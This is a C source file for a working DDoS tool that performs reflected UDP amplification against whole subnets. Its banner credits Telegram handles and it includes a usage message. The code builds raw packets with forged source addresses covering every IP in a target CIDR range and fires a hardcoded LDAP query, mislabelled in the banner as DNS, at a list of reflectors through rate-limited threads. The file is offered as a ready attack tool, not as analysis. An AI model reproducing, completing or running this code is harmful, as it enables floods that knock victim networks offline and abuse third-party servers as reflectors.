/*--------------------------------------------------*\
|  UDP (Default DNS) amplification against subnets.  |
|  Adapted by @Lupoii (Telegram) - 2021.             |
\*--------------------------------------------------*/
//    gcc -pthread dns.c -o dns -lm   // 
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <math.h>

static const char PAYLOAD[] =
    /* using ANY "sl" at the moment */
    "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00";
static unsigned int DPORT = 389;

// Phenomite template begin
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

struct list {
  struct sockaddr_in data;
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in *sins;
  unsigned long num_ips;
};

void print_usage(char *);

void fatal(char *prog_name)
{
	print_usage(prog_name);
	exit(EXIT_FAILURE);
}

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
  iph->id = htonl(61337);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr("127.0.0.1");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(61337);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
  udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in *sins = td->sins;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(tehport);
  iph->saddr = sins[0].sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  int sn_i = 0;
  while (1) {
	if (tehport < 1){
		udph->source = htons((rand() % (64511 - 1024 + 1)) + 1024);
	}
    iph->saddr = sins[sn_i].sin_addr.s_addr;
    list_node = list_node->next;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
    sn_i++;
    if (sn_i >= td->num_ips) {
      sn_i = 0;
    }
  }
}

/*
Function : extractIpOctets
Arguments : 
1) sourceString - String pointer that contains ip address
2) ipAddress - Target variable short type array pointer that will store ip address octets
*/
void extractIpOctets(unsigned char* sourceString, short* ipAddress)
{
    unsigned short len = 0;
    unsigned char oct[4] = { 0 }, cnt = 0, cnt1 = 0, i, buf[5];

    len = strlen(sourceString);
    for (i = 0; i < len; i++) {
        if (sourceString[i] != '.') {
            buf[cnt++] = sourceString[i];
        }
        if (sourceString[i] == '.' || i == len - 1) {
            buf[cnt] = '\0';
            cnt = 0;
            oct[cnt1++] = atoi(buf);
        }
    }
    ipAddress[0] = oct[0];
    ipAddress[1] = oct[1];
    ipAddress[2] = oct[2];
    ipAddress[3] = oct[3];
}



// ip_str ip2str(const ip_address) {
//   ip_str ip_string;
//   snprintf(ip_string, 16, "%d.%d.%d.%d", ip_address.octets[0], ip_address.octets[1], ip_address.octets[2], ip_address.octets[3]);
//   return ip_string;
// }

unsigned int ip2ui(char *ip)
{
	/* An IP consists of four ranges. */
	long ipAsUInt = 0;
	/* Deal with first range. */
	char *cPtr = strtok(ip, ".");
	if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, 3);

	/* Proceed with the remaining ones. */
	int exponent = 2;
	while(cPtr && exponent >= 0)
	{
		cPtr = strtok(NULL, ".\0");
		if(cPtr) ipAsUInt += atoi(cPtr) * pow(256, exponent--);
	}

	return ipAsUInt;
}

char *ui2ip(unsigned int ipAsUInt)
{
	char *ip = malloc(16*sizeof(char));
	int exponent;
	for(exponent = 3; exponent >= 0; --exponent)
	{
		int r = ipAsUInt / pow(256, exponent);
		char buf[4];
		sprintf(buf, "%d", r);
		strcat(ip, buf);
		strcat(ip, ".");
		ipAsUInt -= r*pow(256, exponent);
	}
	/* Replace last dot with '\0'. */
	ip[strlen(ip)-1] = 0;
	return ip;
}

unsigned int createBitmask(const char *bitmask)
{
	unsigned int times = (unsigned int)atol(bitmask)-1, i, bitmaskAsUInt = 1;
	/* Fill in set bits (1) from the right. */
	for(i=0; i<times; ++i)
	{
		bitmaskAsUInt <<= 1;
		bitmaskAsUInt |= 1;
	}
	/* Shift in unset bits from the right. */
	for(i=0; i<32-times-1; ++i)
		bitmaskAsUInt <<= 1;
	return bitmaskAsUInt;
}

// Print Program Usage Instructions
void print_usage(char *prog_name) {
  fprintf(stdout, "Usage: %s <target IP> <port, 0 for random> <reflectors list> <threads> <pps limiter, -1 for no limit> <time>\nMethods by @yfork - Licensed to Nxver\n", prog_name);
  return;
}

int main(int argc, char *argv[]) {
  char *prog_name = argv[0];
  if (argc < 6) {
    print_usage(prog_name);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Loading list to buffer\n");
  int max_len = 512;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  tehport = atoi(argv[2]);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], "r");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
        (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(buffer);
        head->next = head;
        head->prev = head;
      } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->prev = head;
        new_node->next = head->next;
        head->next = new_node;
      }
      i++;
    } else {
      continue;
    }
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  //Custom subnet attack code
  char *ip, *bitmask;
  ip = strtok(argv[1], "/"); // Get IP before the CIDR "/"
  if(!ip) fatal(prog_name);
	bitmask = strtok(NULL, "\0"); // Get the subnet 
	if(!bitmask) fatal(prog_name);
  unsigned int ipAsUInt = ip2ui(ip);
  unsigned int mask_bits = (unsigned int)atol(bitmask);
	unsigned int bitmaskAsUInt = createBitmask(bitmask);
  char *networkAddress = ui2ip(ipAsUInt & bitmaskAsUInt),
		 *broadcastAddress = ui2ip(ipAsUInt | ~bitmaskAsUInt);
  unsigned long num_ips = 1;
  for (i = 32; i > mask_bits; i--) {
    num_ips *= 2;
  }
  printf("IP range spans from %s to %s (Network and broadcast addresses inclusive). Mask is %u bits. Using %lu IPs.\n", networkAddress, broadcastAddress, mask_bits, num_ips);
  struct sockaddr_in *sins = malloc(num_ips*sizeof(struct sockaddr_in)); //Allocate memory for address storage
  short network_octets[4], broadcast_octets[4];
  /* Get the octet values from both the network and broadcast addresses, 
  to be used as minimum and maximum IPs for the range. */
  extractIpOctets(networkAddress, network_octets);
  extractIpOctets(broadcastAddress, broadcast_octets);
  int ips = 0;
  // printf("Generated IPs:\n");
  for (int a = network_octets[0]; a <= broadcast_octets[0]; a++) {
    for (int b = network_octets[1]; b <= broadcast_octets[1]; b++) {
      for (int c = network_octets[2]; c <= broadcast_octets[2]; c++) {
        for (int d = network_octets[3]; d <= broadcast_octets[3]; d++) {
          sins[ips].sin_family = AF_INET;
          char ipAddr[16]; //String for the currently generating IP
          snprintf(ipAddr, 16, "%d.%d.%d.%d", a, b, c, d); //Format the IP string from the individual octets
          sins[ips].sin_addr.s_addr = inet_addr(ipAddr); //Set the IP address as the packet source address for this socket
          ips++;
          // printf("%d: %s\n", ips, ipAddr);
        }
      }
    }
  }
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sins = sins;
    td[i].num_ips = num_ips;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, "Yeeting\n");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}
